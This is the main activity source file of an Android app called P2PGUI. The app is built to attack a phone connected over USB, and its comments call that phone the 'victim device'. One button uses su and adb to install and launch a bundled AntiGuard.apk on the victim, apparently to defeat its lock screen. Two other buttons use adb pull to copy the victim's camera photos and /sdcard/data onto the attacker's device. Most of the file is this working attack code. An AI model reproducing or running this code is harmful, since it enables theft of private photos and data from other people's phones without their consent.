//  This file is part of P2PGUI.
//
//  P2PGUI is free software: you can redistribute it and/or modify
//  it under the terms of the GNU General Public License as published by
//  the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//
//  P2PGUI is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//  GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with P2PGUI.  If not, see <http://www.gnu.org/licenses/>.

package com.shadcat.p2pgui;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import com.shadcat.p2pgui.R;

import android.net.Uri;
import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.view.View;
import android.widget.Button;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
	
	final Button button1 = (Button)  findViewById(R.id.button1);
	
	button1.setOnClickListener(new View.OnClickListener() {
		
		@Override
		public void onClick(View v) {
			// When button is pressed run shell script
			// This part copies the anti from assets to the internal memory of the device
			// This is so we can install the APK and run it on the victim device
			File destFile = new File(getFilesDir(),"AntiGuard.apk");
			try {

			        InputStream in = getAssets().open("AntiGuard.apk");
			        OutputStream out = new FileOutputStream(destFile);

			        byte[] buf = new byte[1024];
			        int len;
			        while ((len = in.read(buf)) > 0) {
			            out.write(buf, 0, len);
			        }
			        in.close();
			        out.close();
			        System.out.println("File copied.");
			    } catch (FileNotFoundException ex) {
			        System.out
			                .println(ex.getMessage() + " in the specified directory.");
			        System.exit(0);
			    } catch (IOException e) {
			        System.out.println(e.getMessage());
			    }
			//Here we change the permissions of the script to execute"
			//Using "Runtime.getRuntime()" to execute variable "installanti"
				String installanti[]={"su","-c", "adb install /data/data/com.shadcat.p2pgui/files/AntiGuard.apk"}; //Setting variable 'installAnti' to install the apk on victim device
		try {
			Process process = Runtime.getRuntime().exec(installanti); //Executing variable "permissions"
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		//Now we run our script (thanks to Kos for the script & anti)
		// which installs and runs anti on the victim device.
		
		String runanti[]={"su","-c", "adb shell am start io.kos.antiguard/.unlock"}; //Setting variable 'runanti' to execute AntiGuard on Victim device
		try {
			Process process = Runtime.getRuntime().exec(runanti); //Executing variable "runanti"
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
				}
	});
	
final Button button3 = (Button)  findViewById(R.id.button3);
	
	button3.setOnClickListener(new View.OnClickListener() {
		
		@Override
		public void onClick(View v) {			
			// Here we create a new folder on our local device"
			// Using "Runtime.getRuntime()" to execute variable "execphotos"
			
				String execphotos[]={"su","-c", "mkdir /sdcard/victim_photos"}; //Setting variable 'execphotos' so we can call it next
		try {
			Process process = Runtime.getRuntime().exec(execphotos); //Executing variable "execphotos"
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		// Now we run our script against the victims phone
		// This script will use adb to pull the all photos in /sdcard/DCIM/camera
		// They get sdcard on our phone in /sdcard/victim_photos
		
		String getphotos[]={"su","-c", "adb pull /sdcard/DCIM/Camera /sdcard/victim_photos"}; //Setting variable 'getphotos' so we can call it next
		try {
			Process process = Runtime.getRuntime().exec(getphotos); //Executing variable "getphotos"
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
				}
	
	
});
	
final Button button2 = (Button)  findViewById(R.id.button2);
	
	button2.setOnClickListener(new View.OnClickListener() {
		
		@Override
		public void onClick(View v) {
			// When button is pressed run shell script
			// This part adb pull to grab the data from the victim device
			// It copies the data to the /sdcard/victim_data folder on your device
			// Using "Runtime.getRuntime()" to execute variable "execdata"
			
				String execdata[]={"su","-c", "mkdir /sdcard/victim_data"}; //Setting variable 'execdata' so we can call it
		try {
			//This is where we make the new folder.
			
			Process process = Runtime.getRuntime().exec(execdata); //Executing variable "execdata"
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		// Now we run our script to grab the data from the victims phone
		// Over USB/ADB this will only grab from /sdcard/data
		// To grab /data we need root on the victim phone (coming later)
		
		String getdata[]={"su","-c", "adb pull /sdcard/data /sdcard/victim_data"}; //Setting variable 'getdata' to make our script executable
		try {
			Process process = Runtime.getRuntime().exec(getdata); //Executing variable "getdata"
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
				}
		


});
	// README button 
	// Having the README button open a web page to the readme file
	
	Button button5 = (Button) findViewById(R.id.button5);
	button5.setOnClickListener(new View.OnClickListener() {
        public void onClick(View v) {
            Intent myWebLink = new Intent(android.content.Intent.ACTION_VIEW);
            myWebLink.setData(Uri.parse("http://www.github.com/x942/p2pgui"));
                startActivity(myWebLink);
         }
	
	});
	
	// README button 
		// Having the README button open a web page to the readme file
		
		Button button4 = (Button) findViewById(R.id.button4);
		button4.setOnClickListener(new View.OnClickListener() {
	        public void onClick(View v) {
	            Intent myWebLink = new Intent(android.content.Intent.ACTION_VIEW);
	            myWebLink.setData(Uri.parse("http://www.shadowdcatconsulting.com/apps"));
	                startActivity(myWebLink);
	         }
		
		});
	
	}
	
}




